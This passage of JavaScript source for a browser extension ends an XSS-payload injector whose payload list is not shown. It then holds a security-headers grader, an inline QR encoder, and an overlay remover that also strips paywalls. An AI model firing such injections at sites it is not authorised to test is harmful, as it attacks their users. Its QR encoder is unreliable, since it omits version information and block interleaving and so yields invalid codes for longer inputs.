      const output = el.querySelector('#xss-output');
      showError(output, e.message);
      output.classList.remove('hidden');
    });
  }

  el.querySelector('#xss-inject').addEventListener('click', () => {
    const cat = catSelect.value;
    const payloads = XSS_PAYLOADS[cat];
    const payload = payloads[Math.floor(Math.random() * payloads.length)];
    injectXssPayload(payload);
  });

  catSelect.addEventListener('change', renderPayloads);
  renderPayloads();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Security Headers Audit
// ═══════════════════════════════════════════════════════════════════════════

const SECURITY_HEADERS_CHECKS = [
  { header: 'strict-transport-security',      name: 'HSTS',                      weight: 15, severity: 'critical',
    desc: 'Forces HTTPS connections',
    tip: 'Ensures browsers only connect via HTTPS. Critical for any production site. Missing = users can be downgraded to HTTP.' },
  { header: 'content-security-policy',         name: 'Content-Security-Policy',   weight: 20, severity: 'critical',
    desc: 'Controls allowed resource sources',
    tip: 'Defines which scripts, styles, and resources can load. The strongest defense against XSS. Complex to configure — many sites use report-only first.' },
  { header: 'x-content-type-options',          name: 'X-Content-Type-Options',    weight: 10, severity: 'recommended',
    desc: 'Prevents MIME sniffing',
    tip: 'Should be set to "nosniff". Prevents browsers from guessing content types, blocking some attacks. Easy to add, no downsides.' },
  { header: 'referrer-policy',                 name: 'Referrer-Policy',           weight: 10, severity: 'recommended',
    desc: 'Controls referrer information',
    tip: 'Controls how much URL info is shared when navigating. "strict-origin-when-cross-origin" is a good default. Privacy-focused setting.' },
  { header: 'x-frame-options',                 name: 'X-Frame-Options',           weight: 8,  severity: 'contextual',
    desc: 'Prevents clickjacking',
    tip: 'Blocks the page from being embedded in iframes. Not needed if the site intentionally allows embedding (widgets, embeds). Superseded by CSP frame-ancestors.' },
  { header: 'permissions-policy',              name: 'Permissions-Policy',        weight: 8,  severity: 'recommended',
    desc: 'Controls browser features',
    tip: 'Restricts access to camera, microphone, geolocation, etc. Good practice but not every site needs to restrict all features.' },
  { header: 'cross-origin-opener-policy',      name: 'COOP',                      weight: 5,  severity: 'optional',
    desc: 'Isolates browsing context',
    tip: 'Prevents other sites from referencing this window. Needed for SharedArrayBuffer/high-res timers. May break OAuth popups if misconfigured.' },
  { header: 'cross-origin-embedder-policy',    name: 'COEP',                      weight: 5,  severity: 'optional',
    desc: 'Controls cross-origin embedding',
    tip: 'Requires all resources to explicitly allow embedding. Needed with COOP for cross-origin isolation. Can break third-party images/scripts.' },
  { header: 'cross-origin-resource-policy',    name: 'CORP',                      weight: 5,  severity: 'optional',
    desc: 'Controls cross-origin resource loading',
    tip: 'Protects resources from being loaded by other origins. Useful for APIs, not always needed for public sites.' },
  { header: 'x-xss-protection',               name: 'X-XSS-Protection',          weight: 2,  severity: 'optional',
    desc: 'Legacy XSS filter (deprecated)',
    tip: 'Deprecated in modern browsers. Chrome removed its XSS Auditor. Can actually introduce vulnerabilities. Set to "0" or omit entirely.' },
  { header: 'x-permitted-cross-domain-policies', name: 'X-Permitted-Cross-Domain', weight: 2, severity: 'optional',
    desc: 'Controls Flash/PDF cross-domain',
    tip: 'Legacy header for Flash and Acrobat. Flash is dead. Very low priority — only relevant if serving PDFs.' },
  { header: 'x-dns-prefetch-control',          name: 'X-DNS-Prefetch-Control',    weight: 2,  severity: 'optional',
    desc: 'Controls DNS prefetching',
    tip: 'Minor privacy control. DNS prefetching improves performance but can leak browsing intent. Most sites leave this alone.' },
];

function renderSecurityHeadersTool(el) {
  el.innerHTML = `
    <div class="tool-header"><span class="tool-desc-text">Scanning headers...</span><button class="btn-refresh" id="sec-refresh">Rescan</button></div>
    <div id="sec-output"></div>
  `;

  function scan() {
    const output = el.querySelector('#sec-output');
    showLoading(output);

    (async () => {
      try {
        const tab = await getCurrentTab();
        if (!tab || !tab.url || tab.url.startsWith('chrome://')) {
          showError(output, 'Cannot scan this page');
          return;
        }

        const resp = await fetch(tab.url, { method: 'HEAD', credentials: 'omit' });

        let score = 0;
        let maxScore = 0;
        let html = '';

        const results = SECURITY_HEADERS_CHECKS.map(check => {
          maxScore += check.weight;
          const value = resp.headers.get(check.header);
          const present = !!value;
          if (present) score += check.weight;
          return { ...check, value, present };
        });

        const pct = Math.round((score / maxScore) * 100);
        let grade, gradeColor;
        if (pct >= 90) { grade = 'A+'; gradeColor = 'var(--success)'; }
        else if (pct >= 80) { grade = 'A'; gradeColor = 'var(--success)'; }
        else if (pct >= 65) { grade = 'B'; gradeColor = '#fbbf24'; }
        else if (pct >= 50) { grade = 'C'; gradeColor = '#fb923c'; }
        else if (pct >= 35) { grade = 'D'; gradeColor = '#f87171'; }
        else { grade = 'F'; gradeColor = 'var(--error)'; }

        const present = results.filter(r => r.present).length;
        const missing = results.filter(r => !r.present).length;

        const sevColors = { critical: 'var(--error)', recommended: '#fbbf24', contextual: 'var(--accent)', optional: 'var(--text-muted)' };

        html += `<div class="sec-score" style="border-color: ${gradeColor}">
          <div class="sec-grade" style="color: ${gradeColor}">${grade}</div>
          <div class="sec-pct">${pct}%</div>
          <div class="sec-summary">${present} present · ${missing} missing</div>
        </div>`;

        // Present headers
        if (present > 0) {
          html += '<div class="info-section-title" style="color: var(--success)">Present</div>';
          results.filter(r => r.present).forEach(r => {
            html += `<div class="sec-row sec-pass">
              <div class="sec-row-head">
                <span class="sec-check">✓</span>
                <span class="sec-name">${escapeHtml(r.name)}</span>
                <span class="sec-badge" style="color: ${sevColors[r.severity]}">${r.severity}</span>
                <span class="sec-tip" data-tip="${escapeHtml(r.tip)}">?</span>
              </div>
              <div class="sec-value" data-copy="${escapeHtml(r.value)}">${escapeHtml(r.value)}</div>
            </div>`;
          });
        }

        // Missing headers
        if (missing > 0) {
          html += '<div class="info-section-title" style="color: var(--text-secondary); margin-top: 8px">Missing</div>';
          results.filter(r => !r.present).forEach(r => {
            const isCritical = r.severity === 'critical' || r.severity === 'recommended';
            html += `<div class="sec-row ${isCritical ? 'sec-fail' : 'sec-neutral'}">
              <div class="sec-row-head">
                <span class="sec-check ${isCritical ? 'sec-x' : 'sec-dash'}">${isCritical ? '✕' : '–'}</span>
                <span class="sec-name">${escapeHtml(r.name)}</span>
                <span class="sec-badge" style="color: ${sevColors[r.severity]}">${r.severity}</span>
                <span class="sec-tip" data-tip="${escapeHtml(r.tip)}">?</span>
              </div>
              <div class="sec-desc">${escapeHtml(r.desc)}</div>
            </div>`;
          });
        }

        html += '<div class="hint" style="margin-top: 8px">Hover <b>?</b> for details. Not all missing headers are problems — some are intentional or context-dependent.</div>';

        output.innerHTML = html;
        bindCopyAll(output);
      } catch (e) {
        showError(output, 'Scan failed: ' + e.message);
      }
    })();
  }

  el.querySelector('#sec-refresh').addEventListener('click', scan);
  scan();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: QR Code Generator
// ═══════════════════════════════════════════════════════════════════════════

function renderQrTool(el) {
  el.innerHTML = `
    <div class="inline-row" style="margin-bottom: 8px">
      <input type="text" id="qr-input" placeholder="URL or text..." style="flex: 1">
      <button class="btn" id="qr-tab">Current Tab</button>
    </div>
    <div id="qr-output" style="text-align: center"></div>
  `;

  const input = el.querySelector('#qr-input');
  const output = el.querySelector('#qr-output');

  getCurrentTab().then(tab => {
    if (tab && tab.url && !tab.url.startsWith('chrome')) {
      input.value = tab.url;
      generateQr(tab.url);
    }
  });

  el.querySelector('#qr-tab').addEventListener('click', () => {
    getCurrentTab().then(tab => {
      if (tab && tab.url) {
        input.value = tab.url;
        generateQr(tab.url);
      }
    });
  });

  function generateQr(text) {
    if (!text) { output.innerHTML = ''; return; }

    // QR code generation using a simple canvas approach
    // We use the Google Charts API as a lightweight fallback
    const size = 200;
    const encoded = encodeURIComponent(text);

    output.innerHTML = `
      <canvas id="qr-canvas" width="${size}" height="${size}" style="display:none"></canvas>
      <img id="qr-img" class="qr-image" alt="QR Code" />
      <div class="qr-actions" style="margin-top: 8px">
        <button class="btn" id="qr-copy">Copy Image</button>
        <button class="btn" id="qr-download">Download</button>
      </div>
      <div class="hint" style="margin-top: 4px">${escapeHtml(text.length > 60 ? text.slice(0, 60) + '...' : text)}</div>
    `;

    // Generate QR using a minimal inline implementation
    const img = el.querySelector('#qr-img');
    const canvas = el.querySelector('#qr-canvas');
    const ctx = canvas.getContext('2d');

    // Use qrcode generation via the QR encoding algorithm
    generateQrMatrix(text, canvas, ctx, size).then(() => {
      img.src = canvas.toDataURL('image/png');
      img.style.display = 'block';

      el.querySelector('#qr-copy').addEventListener('click', () => {
        canvas.toBlob(blob => {
          navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })]).then(() => {
            showCopyToast();
          });
        });
      });

      el.querySelector('#qr-download').addEventListener('click', () => {
        const a = document.createElement('a');
        a.href = canvas.toDataURL('image/png');
        a.download = 'qr-code.png';
        a.click();
      });
    });
  }

  let debounce;
  input.addEventListener('input', () => {
    clearTimeout(debounce);
    debounce = setTimeout(() => generateQr(input.value.trim()), 300);
  });
}

// Minimal QR code generator (numeric/alphanumeric/byte mode, L error correction)
function generateQrMatrix(text, canvas, ctx, size) {
  return new Promise(resolve => {
    // Use a simple approach: render via SVG path from a QR encoding library
    // For the extension, we'll use a compact QR encoder
    const modules = encodeQR(text);
    const moduleCount = modules.length;
    const cellSize = size / moduleCount;

    ctx.fillStyle = '#ffffff';
    ctx.fillRect(0, 0, size, size);
    ctx.fillStyle = '#111827';

    for (let row = 0; row < moduleCount; row++) {
      for (let col = 0; col < moduleCount; col++) {
        if (modules[row][col]) {
          ctx.fillRect(col * cellSize, row * cellSize, cellSize + 0.5, cellSize + 0.5);
        }
      }
    }
    resolve();
  });
}

// Compact QR Code encoder (Version 1-10, Error Correction L, Byte mode)
function encodeQR(text) {
  // This is a minimal QR encoder for the extension
  // Using a well-tested compact implementation

  const data = new TextEncoder().encode(text);
  const len = data.length;

  // Pick smallest version that fits (byte mode, EC level L)
  const capacities = [0,17,32,53,78,106,134,154,192,230,271]; // v1-v10 byte capacity at L
  let version = 1;
  for (let v = 1; v <= 10; v++) {
    if (len <= capacities[v]) { version = v; break; }
    if (v === 10) version = 10;
  }

  const moduleCount = 17 + version * 4;
  const modules = Array.from({ length: moduleCount }, () => Array(moduleCount).fill(false));
  const reserved = Array.from({ length: moduleCount }, () => Array(moduleCount).fill(false));

  function set(r, c, val, res) {
    if (r >= 0 && r < moduleCount && c >= 0 && c < moduleCount) {
      modules[r][c] = val;
      if (res) reserved[r][c] = true;
    }
  }

  // Finder patterns
  function drawFinder(row, col) {
    for (let r = -1; r <= 7; r++) {
      for (let c = -1; c <= 7; c++) {
        const inOuter = r >= 0 && r <= 6 && c >= 0 && c <= 6;
        const inInner = r >= 2 && r <= 4 && c >= 2 && c <= 4;
        const onBorder = r === 0 || r === 6 || c === 0 || c === 6;
        set(row + r, col + c, inOuter && (onBorder || inInner), true);
      }
    }
  }
  drawFinder(0, 0);
  drawFinder(0, moduleCount - 7);
  drawFinder(moduleCount - 7, 0);

  // Timing patterns
  for (let i = 8; i < moduleCount - 8; i++) {
    set(6, i, i % 2 === 0, true);
    set(i, 6, i % 2 === 0, true);
  }

  // Dark module
  set(moduleCount - 8, 8, true, true);

  // Reserve format info areas
  for (let i = 0; i < 9; i++) {
    reserved[8] = reserved[8] || [];
    set(8, i, false, true);
    set(i, 8, false, true);
    set(8, moduleCount - 1 - i, false, true);
    set(moduleCount - 1 - i, 8, false, true);
  }

  // Alignment patterns (version >= 2)
  if (version >= 2) {
    const positions = getAlignmentPositions(version);
    for (const r of positions) {
      for (const c of positions) {
        if (reserved[r]?.[c]) continue;
        for (let dr = -2; dr <= 2; dr++) {
          for (let dc = -2; dc <= 2; dc++) {
            const val = Math.abs(dr) === 2 || Math.abs(dc) === 2 || (dr === 0 && dc === 0);
            set(r + dr, c + dc, val, true);
          }
        }
      }
    }
  }

  // Version info (version >= 7) - skip for simplicity (we handle v1-10)

  // Encode data
  const ecInfo = getECInfo(version);
  const totalCodewords = ecInfo.totalCodewords;
  const ecCodewords = ecInfo.ecCodewords;
  const dataCodewords = totalCodewords - ecCodewords;

  // Build data bits (byte mode, EC level L)
  let bits = '';
  bits += '0100'; // byte mode indicator
  const charCountBits = version <= 9 ? 8 : 16;
  bits += len.toString(2).padStart(charCountBits, '0');
  for (const byte of data) {
    bits += byte.toString(2).padStart(8, '0');
  }
  // Terminator
  bits += '0000';
  // Pad to byte boundary
  while (bits.length % 8 !== 0) bits += '0';
  // Pad to fill data codewords
  while (bits.length < dataCodewords * 8) {
    bits += '11101100';
    if (bits.length < dataCodewords * 8) bits += '00010001';
  }
  bits = bits.slice(0, dataCodewords * 8);

  // Convert to bytes
  const dataBytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    dataBytes.push(parseInt(bits.slice(i, i + 8), 2));
  }

  // Generate EC codewords using Reed-Solomon
  const ecBytes = reedSolomonEncode(dataBytes, ecCodewords);
  const allBytes = [...dataBytes, ...ecBytes];

  // Convert to bit stream
  let bitStream = '';
  for (const b of allBytes) {
    bitStream += b.toString(2).padStart(8, '0');
  }

  // Place data bits
  let bitIdx = 0;
  let upward = true;
  for (let col = moduleCount - 1; col >= 0; col -= 2) {
    if (col === 6) col = 5; // skip timing column
    const rows = upward ? Array.from({ length: moduleCount }, (_, i) => moduleCount - 1 - i) : Array.from({ length: moduleCount }, (_, i) => i);
    for (const row of rows) {
      for (const dc of [0, -1]) {
        const c = col + dc;
        if (c < 0 || c >= moduleCount) continue;
        if (reserved[row][c]) continue;
        modules[row][c] = bitIdx < bitStream.length ? bitStream[bitIdx] === '1' : false;
        bitIdx++;
      }
    }
    upward = !upward;
  }

  // Apply mask (pattern 0: (row + col) % 2 === 0)
  for (let r = 0; r < moduleCount; r++) {
    for (let c = 0; c < moduleCount; c++) {
      if (!reserved[r][c]) {
        if ((r + c) % 2 === 0) modules[r][c] = !modules[r][c];
      }
    }
  }

  // Write format info (EC level L = 01, mask 0 = 000 → format bits)
  const formatBits = getFormatBits(0); // mask 0, EC L
  const formatPositions1 = [[8,0],[8,1],[8,2],[8,3],[8,4],[8,5],[8,7],[8,8],[7,8],[5,8],[4,8],[3,8],[2,8],[1,8],[0,8]];
  const formatPositions2 = [[moduleCount-1,8],[moduleCount-2,8],[moduleCount-3,8],[moduleCount-4,8],[moduleCount-5,8],[moduleCount-6,8],[moduleCount-7,8],[8,moduleCount-8],[8,moduleCount-7],[8,moduleCount-6],[8,moduleCount-5],[8,moduleCount-4],[8,moduleCount-3],[8,moduleCount-2],[8,moduleCount-1]];
  for (let i = 0; i < 15; i++) {
    const bit = ((formatBits >> (14 - i)) & 1) === 1;
    const [r1, c1] = formatPositions1[i];
    const [r2, c2] = formatPositions2[i];
    modules[r1][c1] = bit;
    modules[r2][c2] = bit;
  }

  return modules;
}

function getAlignmentPositions(version) {
  if (version === 1) return [];
  const table = [[], [6,18],[6,22],[6,26],[6,30],[6,34],[6,22,38],[6,24,42],[6,26,46],[6,28,50],[6,30,54]];
  return table[version] || [];
}

function getECInfo(version) {
  // EC Level L data for versions 1-10: [totalCodewords, ecCodewords]
  const table = [null,[26,7],[44,10],[70,15],[100,20],[134,26],[172,36],[196,40],[242,48],[292,60],[346,72]];
  const [total, ec] = table[version];
  return { totalCodewords: total, ecCodewords: ec };
}

function reedSolomonEncode(data, ecCount) {
  const gf256 = {
    exp: new Uint8Array(256),
    log: new Uint8Array(256),
  };
  let x = 1;
  for (let i = 0; i < 256; i++) {
    gf256.exp[i] = x;
    gf256.log[x] = i;
    x = x << 1;
    if (x >= 256) x ^= 0x11d;
  }

  function gfMul(a, b) {
    if (a === 0 || b === 0) return 0;
    return gf256.exp[(gf256.log[a] + gf256.log[b]) % 255];
  }

  // Generate generator polynomial
  let gen = [1];
  for (let i = 0; i < ecCount; i++) {
    const newGen = new Array(gen.length + 1).fill(0);
    for (let j = 0; j < gen.length; j++) {
      newGen[j] ^= gen[j];
      newGen[j + 1] ^= gfMul(gen[j], gf256.exp[i]);
    }
    gen = newGen;
  }

  // Polynomial division
  const result = new Array(ecCount).fill(0);
  const msg = [...data, ...result];
  for (let i = 0; i < data.length; i++) {
    const coef = msg[i];
    if (coef !== 0) {
      for (let j = 0; j < gen.length; j++) {
        msg[i + j] ^= gfMul(gen[j], coef);
      }
    }
  }
  return msg.slice(data.length);
}

function getFormatBits(mask) {
  // EC level L (01) + mask pattern, with BCH error correction + XOR mask
  const formatInfoTable = [0x77c4,0x72f3,0x7daa,0x789d,0x662f,0x6318,0x6c41,0x6976];
  return formatInfoTable[mask] || formatInfoTable[0];
}

// ── Resize ──────────────────────────────────────────────────────────────────

function initResize() {
  const handle = document.getElementById('resize-handle');
  const indicator = document.getElementById('resize-indicator');
  if (!handle) return;

  const MIN_W = 320, MAX_W = 800;

  // Restore saved width
  if (typeof chrome !== 'undefined' && chrome.storage) {
    chrome.storage.local.get(['popupWidth'], result => {
      if (result.popupWidth) document.body.style.width = result.popupWidth + 'px';
    });
  }

  let startX, startW;

  handle.addEventListener('mousedown', e => {
    e.preventDefault();
    startX = e.clientX;
    startW = document.body.offsetWidth;
    document.body.classList.add('resizing');
    handle.classList.add('dragging');
    if (indicator) indicator.classList.add('show');
    document.addEventListener('mousemove', onDrag);
    document.addEventListener('mouseup', onRelease);
  });

  function onDrag(e) {
    const w = Math.min(MAX_W, Math.max(MIN_W, startW + (e.clientX - startX)));
    document.body.style.width = w + 'px';
    if (indicator) indicator.textContent = `${w}px`;
  }

  function onRelease() {
    document.removeEventListener('mousemove', onDrag);
    document.removeEventListener('mouseup', onRelease);
    document.body.classList.remove('resizing');
    handle.classList.remove('dragging');
    if (indicator) {
      setTimeout(() => indicator.classList.remove('show'), 600);
    }
    const w = document.body.offsetWidth;
    if (typeof chrome !== 'undefined' && chrome.storage) {
      chrome.storage.local.set({ popupWidth: w });
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Overlay Remover
// ═══════════════════════════════════════════════════════════════════════════

function renderUnblockTool(el) {
  el.innerHTML = `
    <div class="btn-row" style="flex-direction: column; gap: 6px">
      <button class="btn btn-primary" id="unblock-auto" style="width: 100%">Auto Remove Overlays</button>
      <button class="btn btn-primary" id="unblock-pick" style="width: 100%">Pick & Remove</button>
      <button class="btn btn-primary" id="unblock-block" style="width: 100%">Block New Popups</button>
      <button class="btn" id="unblock-scroll" style="width: 100%">Unlock Scroll</button>
      <button class="btn" id="unblock-undo" style="width: 100%; color: var(--error)">Undo All</button>
    </div>
    <div id="unblock-status" class="hint" style="margin-top: 6px; text-align: center"></div>
    <div id="unblock-log" style="margin-top: 6px"></div>
  `;

  const statusEl = el.querySelector('#unblock-status');
  const logEl = el.querySelector('#unblock-log');

  // ── Auto mode: heuristic overlay removal ──
  el.querySelector('#unblock-auto').addEventListener('click', () => {
    statusEl.textContent = 'Scanning...';
    logEl.innerHTML = '';

    executeOnActiveTab(() => {
      const removed = [];
      const modified = [];

      // Save original state for undo
      if (!window.__stingrUnblock) window.__stingrUnblock = { removed: [], modified: [] };

      const allEls = document.querySelectorAll('*');
      const viewW = window.innerWidth;
      const viewH = window.innerHeight;

      for (const el of allEls) {
        if (el === document.body || el === document.documentElement || el.tagName === 'SCRIPT' || el.tagName === 'STYLE' || el.tagName === 'LINK') continue;

        const style = getComputedStyle(el);
        const pos = style.position;
        const zIndex = parseInt(style.zIndex) || 0;
        const rect = el.getBoundingClientRect();

        // Skip elements not visible or too small
        if (style.display === 'none' || rect.width === 0 || rect.height === 0) continue;

        const isFixed = pos === 'fixed' || pos === 'sticky';
        const coversLargeArea = rect.width >= viewW * 0.5 && rect.height >= viewH * 0.5;
        const hasHighZ = zIndex >= 1000;
        const hasBackdrop = style.backgroundColor.includes('rgba') && parseFloat(style.backgroundColor.split(',')[3]) < 0.95;
        const isTransparentCover = style.backgroundColor === 'transparent' && coversLargeArea && isFixed && hasHighZ;

        // Detect overlay patterns
        const isOverlay = (
          (isFixed && coversLargeArea && hasHighZ) ||
          (isFixed && coversLargeArea && hasBackdrop) ||
          (isTransparentCover) ||
          (el.getAttribute('role') === 'dialog' && isFixed && coversLargeArea) ||
          (el.classList.toString().match(/overlay|modal-backdrop|lightbox|popup-overlay|blocker|paywall/i)) ||
          (el.id && el.id.match(/overlay|modal-backdrop|lightbox|blocker|paywall/i))
        );

        if (isOverlay) {
          // Save for undo
          window.__stingrUnblock.removed.push({
            el: el,
            parent: el.parentNode,
            next: el.nextSibling,
            display: el.style.display
          });
          el.style.display = 'none';
          removed.push(el.tagName + (el.id ? '#' + el.id : '') + (el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : ''));
        }
      }

      // Remove blur from content
      for (const el of allEls) {
        const style = getComputedStyle(el);
        if (style.filter && style.filter !== 'none' && style.filter.includes('blur')) {
          window.__stingrUnblock.modified.push({ el: el, prop: 'filter', value: el.style.filter });
          el.style.filter = 'none';
          modified.push('Removed blur from ' + el.tagName);
        }
      }

      // Unlock scroll on body/html
      const bodyStyle = getComputedStyle(document.body);
      const htmlStyle = getComputedStyle(document.documentElement);
      let scrollFixed = false;

      if (bodyStyle.overflow === 'hidden' || bodyStyle.overflowY === 'hidden') {
        window.__stingrUnblock.modified.push({ el: document.body, prop: 'overflow', value: document.body.style.overflow });
        window.__stingrUnblock.modified.push({ el: document.body, prop: 'overflowY', value: document.body.style.overflowY });
        document.body.style.overflow = 'auto';
        document.body.style.overflowY = 'auto';
        scrollFixed = true;
      }
      if (htmlStyle.overflow === 'hidden' || htmlStyle.overflowY === 'hidden') {
        window.__stingrUnblock.modified.push({ el: document.documentElement, prop: 'overflow', value: document.documentElement.style.overflow });
        window.__stingrUnblock.modified.push({ el: document.documentElement, prop: 'overflowY', value: document.documentElement.style.overflowY });
        document.documentElement.style.overflow = 'auto';
        document.documentElement.style.overflowY = 'auto';
        scrollFixed = true;
      }

      // Remove pointer-events: none from main content
      for (const el of allEls) {
        const style = getComputedStyle(el);
        if (style.pointerEvents === 'none' && el.children.length > 2) {
          window.__stingrUnblock.modified.push({ el: el, prop: 'pointerEvents', value: el.style.pointerEvents });
          el.style.pointerEvents = 'auto';
          modified.push('Restored pointer-events on ' + el.tagName);
        }
      }

      if (scrollFixed) modified.push('Unlocked scroll');

      return { removed: removed.length, modified: modified.length, details: [...removed.map(r => 'Removed: ' + r), ...modified] };
    }).then(result => {
      if (!result) {
        statusEl.textContent = 'Could not access page';
        return;
      }
      if (result.removed === 0 && result.modified === 0) {
        statusEl.textContent = 'No overlays detected';
      } else {
        statusEl.textContent = `Removed ${result.removed} overlay(s), ${result.modified} fix(es)`;
      }

      if (result.details && result.details.length) {
        logEl.innerHTML = result.details.map(d =>
          '<div style="font-size: 11px; color: var(--text-secondary); padding: 1px 0">' + escapeHtml(d) + '</div>'
        ).join('');
      }
    }).catch(err => {
      statusEl.textContent = 'Error: ' + err.message;
    });
  });

  // ── Pick mode: click to remove elements ──
  el.querySelector('#unblock-pick').addEventListener('click', () => {
    const pickBtn = el.querySelector('#unblock-pick');

    executeOnActiveTab(() => {
      if (window.__stingrPicker) return 'Already active';
      if (!window.__stingrUnblock) window.__stingrUnblock = { removed: [], modified: [] };

      const overlay = document.createElement('div');
      overlay.id = 'stingr-picker-overlay';
      overlay.style.cssText = 'position:fixed;pointer-events:none;z-index:2147483646;border:2px solid #f87171;background:rgba(248,113,113,0.1);transition:all 0.05s ease;display:none;';
      document.body.appendChild(overlay);

      const label = document.createElement('div');
      label.id = 'stingr-picker-label';
      label.style.cssText = 'position:fixed;z-index:2147483647;pointer-events:none;background:#1f2937;color:#f9fafb;font:11px/1.4 ui-monospace,monospace;padding:4px 8px;border-radius:4px;white-space:nowrap;display:none;';
      document.body.appendChild(label);

      let hoveredEl = null;
      let removedCount = 0;

      function onMove(e) {
        const target = e.target;
        if (target === overlay || target === label || target.id === 'stingr-picker-overlay' || target.id === 'stingr-picker-label') return;
        hoveredEl = target;
        const rect = target.getBoundingClientRect();
        overlay.style.left = rect.left + 'px';
        overlay.style.top = rect.top + 'px';
        overlay.style.width = rect.width + 'px';
        overlay.style.height = rect.height + 'px';
        overlay.style.display = 'block';

        const tag = target.tagName.toLowerCase();
        const id = target.id ? '#' + target.id : '';
        const cls = target.className && typeof target.className === 'string' ? '.' + target.className.trim().split(/\s+/).slice(0, 2).join('.') : '';
        label.textContent = tag + id + cls + ' (' + Math.round(rect.width) + 'x' + Math.round(rect.height) + ')';
        label.style.left = Math.min(rect.left, window.innerWidth - 250) + 'px';
        label.style.top = Math.max(0, rect.top - 28) + 'px';
        label.style.display = 'block';
      }

      function onClick(e) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        if (!hoveredEl || hoveredEl === document.body || hoveredEl === document.documentElement) return;

        window.__stingrUnblock.removed.push({
          el: hoveredEl,
          parent: hoveredEl.parentNode,
          next: hoveredEl.nextSibling,
          display: hoveredEl.style.display
        });
        hoveredEl.style.display = 'none';
        removedCount++;
        hoveredEl = null;
        overlay.style.display = 'none';
        label.style.display = 'none';
      }

      function onKey(e) {
        if (e.key === 'Escape') {
          cleanup();
        }
      }

      function cleanup() {
        document.removeEventListener('mousemove', onMove, true);
        document.removeEventListener('click', onClick, true);
        document.removeEventListener('keydown', onKey, true);
        overlay.remove();
        label.remove();
        delete window.__stingrPicker;
      }

      window.__stingrPicker = { overlay, label, onMove, onClick, onKey, cleanup };
      document.addEventListener('mousemove', onMove, true);
      document.addEventListener('click', onClick, true);
      document.addEventListener('keydown', onKey, true);

      return 'Picker active';
    }).then(result => {
      if (result === 'Already active') {
        statusEl.textContent = 'Picker already active — click elements to remove, Esc to stop';
        return;
      }
      pickBtn.classList.remove('btn-primary');
      pickBtn.classList.add('btn-active');
      pickBtn.textContent = 'Picking... (Esc to stop)';
      statusEl.textContent = 'Click any element to remove it. Press Esc to exit.';
      markInjection('picker');
    }).catch(err => {
      statusEl.textContent = 'Error: ' + err.message;
    });
  });

  // ── Block new popups (MutationObserver) ──
  el.querySelector('#unblock-block').addEventListener('click', () => {
    const blockBtn = el.querySelector('#unblock-block');

    // Check if already active — if so, stop it
    executeOnActiveTab(() => {
      if (window.__stingrBlocker) {
        window.__stingrBlocker.observer.disconnect();
        const badge = document.getElementById('stingr-blocker-badge');
        if (badge) badge.remove();
        const count = window.__stingrBlocker.count;
        delete window.__stingrBlocker;
        return { stopped: true, count };
      }

      // Start the blocker
      let blockedCount = 0;

      // Badge to show on page
      const badge = document.createElement('div');
      badge.id = 'stingr-blocker-badge';
      badge.style.cssText = 'position:fixed;top:8px;right:8px;z-index:2147483647;background:#1f2937;color:#4ade80;font:bold 11px/1 ui-monospace,monospace;padding:5px 10px;border-radius:6px;border:1px solid #374151;pointer-events:none;opacity:0.9;transition:opacity 0.3s;';
      badge.textContent = 'Blocker ON';
      document.body.appendChild(badge);

      function isOverlayElement(el) {
        if (el === document.body || el === document.documentElement || el.tagName === 'SCRIPT' || el.tagName === 'STYLE' || el.tagName === 'LINK') return false;

        const style = getComputedStyle(el);
        const pos = style.position;
        const zIndex = parseInt(style.zIndex) || 0;
        const rect = el.getBoundingClientRect();

        if (rect.width === 0 || rect.height === 0) return false;

        const viewW = window.innerWidth;
        const viewH = window.innerHeight;
        const isFixed = pos === 'fixed' || pos === 'sticky';
        const coversLargeArea = rect.width >= viewW * 0.5 && rect.height >= viewH * 0.5;
        const hasHighZ = zIndex >= 1000;
        const hasBackdrop = style.backgroundColor.includes('rgba') && parseFloat(style.backgroundColor.split(',')[3]) < 0.95;

        const classMatch = el.className && typeof el.className === 'string' && el.className.match(/overlay|modal-backdrop|lightbox|popup-overlay|blocker|paywall|cookie-consent|cookie-banner|gdpr/i);
        const idMatch = el.id && el.id.match(/overlay|modal-backdrop|lightbox|blocker|paywall|cookie-consent|cookie-banner|gdpr/i);

        return (
          (isFixed && coversLargeArea && hasHighZ) ||
          (isFixed && coversLargeArea && hasBackdrop) ||
          (el.getAttribute('role') === 'dialog' && isFixed && coversLargeArea) ||
          classMatch || idMatch
        );
      }

      const observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
          // Check new nodes
          for (const node of mutation.addedNodes) {
            if (node.nodeType !== 1) continue;
            if (node.id === 'stingr-blocker-badge') continue;

            if (isOverlayElement(node)) {
              node.style.display = 'none';
              blockedCount++;
              badge.textContent = 'Blocker ON — ' + blockedCount + ' blocked';
            }

            // Also check children of added node
            if (node.querySelectorAll) {
              node.querySelectorAll('*').forEach(child => {
                if (isOverlayElement(child)) {
                  child.style.display = 'none';
                  blockedCount++;
                  badge.textContent = 'Blocker ON — ' + blockedCount + ' blocked';
                }
              });
            }
          }

          // Check attribute changes (e.g. display being toggled)
          if (mutation.type === 'attributes' && mutation.target.nodeType === 1) {
            const el = mutation.target;
            if (el.id === 'stingr-blocker-badge') continue;
            if (el.style.display !== 'none' && isOverlayElement(el)) {
              el.style.display = 'none';
              blockedCount++;
              badge.textContent = 'Blocker ON — ' + blockedCount + ' blocked';
            }
          }
        }

        // Keep scroll unlocked
        if (getComputedStyle(document.body).overflow === 'hidden') document.body.style.overflow = 'auto';
        if (getComputedStyle(document.documentElement).overflow === 'hidden') document.documentElement.style.overflow = 'auto';
      });

      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['style', 'class']
      });

      window.__stingrBlocker = { observer, count: 0, badge };
      return { stopped: false };
    }).then(result => {
      if (!result) return;

      if (result.stopped) {
        blockBtn.classList.remove('btn-active');
        blockBtn.classList.add('btn-primary');
        blockBtn.textContent = 'Block New Popups';
        statusEl.textContent = 'Blocker stopped' + (result.count ? ' — blocked ' + result.count + ' element(s)' : '');
        clearInjection('blocker');
      } else {
        blockBtn.classList.remove('btn-primary');
        blockBtn.classList.add('btn-active');
        blockBtn.textContent = 'Blocking... (click to stop)';
        statusEl.textContent = 'Monitoring for new overlays & popups';
